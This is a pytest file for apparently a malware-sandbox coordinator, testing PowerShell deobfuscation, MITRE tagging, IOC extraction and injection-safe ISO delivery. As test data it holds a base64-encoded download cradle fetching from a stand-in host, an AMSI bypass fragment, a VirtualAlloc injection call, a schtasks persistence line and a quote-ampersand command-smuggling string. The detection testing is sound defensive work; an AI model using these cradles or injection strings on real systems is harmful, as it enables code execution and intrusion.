"""PowerShell command submissions: peeling, scoring, and safe delivery."""

import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from coordinator import psanalyse  # noqa: E402
from coordinator.payload import RUN_BAT_PS, build_payload_iso  # noqa: E402
from coordinator.pcapparse import NetFacts  # noqa: E402
from coordinator.verdict import assess  # noqa: E402

CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://evil.invalid/a.ps1')"


def enc(text: str) -> str:
    """Base64 of UTF-16LE -- what powershell.exe -EncodedCommand consumes."""
    return base64.b64encode(text.encode("utf-16-le")).decode()


# -- peeling -------------------------------------------------------------------


def test_a_plain_command_has_one_layer():
    assert psanalyse.peel("Get-Process") == ["Get-Process"]


def test_encodedcommand_is_peeled():
    layers = psanalyse.peel(f"powershell -nop -w hidden -enc {enc(CRADLE)}")
    assert len(layers) == 2
    assert CRADLE in layers[1]


def test_nested_encoding_is_peeled_to_the_bottom():
    inner = enc(CRADLE)
    outer = enc(f"powershell -enc {inner}")
    layers = psanalyse.peel(f"powershell -enc {outer}")
    assert len(layers) == 3
    assert CRADLE in layers[-1]


def test_peeling_is_bounded():
    """A very deep chain stops at the layer cap instead of running away.

    Ten rounds, not thirty: UTF-16LE then base64 grows the text ~2.67x per
    round, so a deep chain explodes long before the peeler is the problem.
    """
    text = "A" * 8
    for _ in range(10):
        text = enc(text)
    layers = psanalyse.peel(text)
    assert len(layers) == psanalyse.MAX_LAYERS + 1   # capped, not exhausted


def test_binary_base64_is_not_mistaken_for_a_layer():
    blob = base64.b64encode(bytes(range(256)) * 4).decode()
    assert psanalyse.peel(f"$x = '{blob}'") == [f"$x = '{blob}'"]


# -- technique detection -------------------------------------------------------


def test_download_cradle_is_recognised_through_the_encoding():
    res = psanalyse.analyse(f"powershell -nop -w hidden -enc {enc(CRADLE)}")
    assert res.deobfuscated
    assert "T1059.001" in res.mitre      # it is PowerShell
    assert "T1105" in res.mitre          # download cradle
    assert "T1140" in res.mitre          # decoded to find it
    assert "T1027.010" in res.mitre      # command obfuscation
    assert res.score >= 60


def test_iocs_come_from_the_decoded_layer_not_the_surface():
    """The whole point of peeling: the C2 is not in the submitted text."""
    submitted = f"powershell -enc {enc(CRADLE)}"
    assert "evil.invalid" not in submitted
    res = psanalyse.analyse(submitted)
    assert "http://evil.invalid/a.ps1" in res.iocs["urls"]
    assert "evil.invalid" in res.iocs["domains"]


def test_amsi_tampering_is_flagged():
    res = psanalyse.analyse(
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    )
    assert "T1562.001" in res.mitre


def test_injection_primitives_are_flagged():
    res = psanalyse.analyse("$m=[DllImport]::VirtualAlloc(0,0x1000,0x3000,0x40)")
    assert "T1055" in res.mitre


def test_persistence_is_flagged():
    res = psanalyse.analyse("schtasks /create /tn upd /tr calc.exe /sc onlogon")
    assert "T1053.005" in res.mitre


def test_a_benign_command_scores_low_and_stays_unknown():
    res = psanalyse.analyse("Get-ChildItem C:\\Users | Select-Object Name")
    assert res.mitre == ["T1059.001"]
    assert res.score == 0
    scored = assess(
        psanalyse.to_static("Get-ChildItem", res), NetFacts(), ran=True,
        extra_score=res.score, extra_mitre=tuple(res.mitre),
    )
    assert scored["verdict"] == "unknown"


def test_findings_fold_into_one_verdict():
    res = psanalyse.analyse(f"powershell -enc {enc(CRADLE)}")
    scored = assess(
        psanalyse.to_static("x", res), NetFacts(), ran=True,
        extra_score=res.score,
        extra_mitre=tuple(res.mitre),
        extra_reasons=tuple(res.techniques[:3]),
    )
    assert scored["verdict"] == "malicious"
    assert "T1105" in scored["mitre"]
    assert scored["summary"]


def test_to_static_carries_the_command_and_layers():
    res = psanalyse.analyse(f"powershell -enc {enc(CRADLE)}")
    static = psanalyse.to_static("cmd", res)
    assert static["type"] == "powershell"
    assert static["command"] == "cmd"
    assert static["ps_deobfuscated"] is True
    assert any(CRADLE in layer for layer in static["ps_layers"])
    # An archive/PE heuristic must not fire on a command.
    assert static["packed"] is False and static["eicar"] is False


def test_events_expose_each_decoded_layer():
    res = psanalyse.analyse(f"powershell -enc {enc(CRADLE)}")
    msgs = [e["msg"] for e in psanalyse.events(res)]
    assert any("decode layer 1" in m for m in msgs)
    assert any("download cradle" in m for m in msgs)


# -- delivery ------------------------------------------------------------------


def test_the_runner_never_embeds_the_submitted_command():
    """The security property.

    The command is attacker-controlled text. If it were interpolated into
    run.bat, a submission carrying a quote and an ampersand would execute on
    the coordinator host at ISO-build time -- an analysis request turned into
    RCE against the hypervisor. It must travel as inert bytes.
    """
    # No format placeholder survives, so there is no seam to inject through.
    assert "{" not in RUN_BAT_PS and "}" not in RUN_BAT_PS
    assert "payload.ps1" in RUN_BAT_PS
    assert "powershell.exe" in RUN_BAT_PS
    # -File, not -Command: the script is read from disk rather than parsed
    # off a command line the batch interpreter has already expanded.
    assert "-File" in RUN_BAT_PS and "-Command" not in RUN_BAT_PS


def test_hostile_command_text_reaches_the_iso_verbatim(tmp_path, monkeypatch):
    hostile = 'x" & calc.exe & echo "pwned\n$a=1  # ünïcödé'
    captured = {}

    def fake_run(cmd, **kw):
        stage = cmd[-1]
        with open(os.path.join(stage, "run.bat"), encoding="utf-8") as fh:
            captured["bat"] = fh.read()
        with open(os.path.join(stage, "sample", "payload.ps1"), "rb") as fh:
            captured["ps1"] = fh.read()

        class P:
            returncode = 0
            stderr = ""
        return P()

    monkeypatch.setattr("coordinator.payload.subprocess.run", fake_run)
    iso_dir = tmp_path / "iso"
    iso_dir.mkdir()
    build_payload_iso(
        hostile.encode(), "ignored.txt", str(tmp_path), str(iso_dir), "run1",
        kind="powershell",
    )

    # The command is in the payload file, and nowhere near the batch file.
    assert b"calc.exe" in captured["ps1"]
    assert "calc.exe" not in captured["bat"]
    assert "pwned" not in captured["bat"]
    assert captured["ps1"].startswith(b"\xef\xbb\xbf")   # BOM for powershell.exe


def test_file_submissions_still_use_the_plain_runner(tmp_path, monkeypatch):
    captured = {}

    def fake_run(cmd, **kw):
        stage = cmd[-1]
        with open(os.path.join(stage, "run.bat"), encoding="utf-8") as fh:
            captured["bat"] = fh.read()

        class P:
            returncode = 0
            stderr = ""
        return P()

    monkeypatch.setattr("coordinator.payload.subprocess.run", fake_run)
    iso_dir = tmp_path / "iso"
    iso_dir.mkdir()
    build_payload_iso(b"MZ", "drop per.exe", str(tmp_path), str(iso_dir), "run2")

    assert "start " in captured["bat"]
    assert "powershell.exe" not in captured["bat"]
    assert "drop_per.exe" in captured["bat"]   # sanitised, space removed
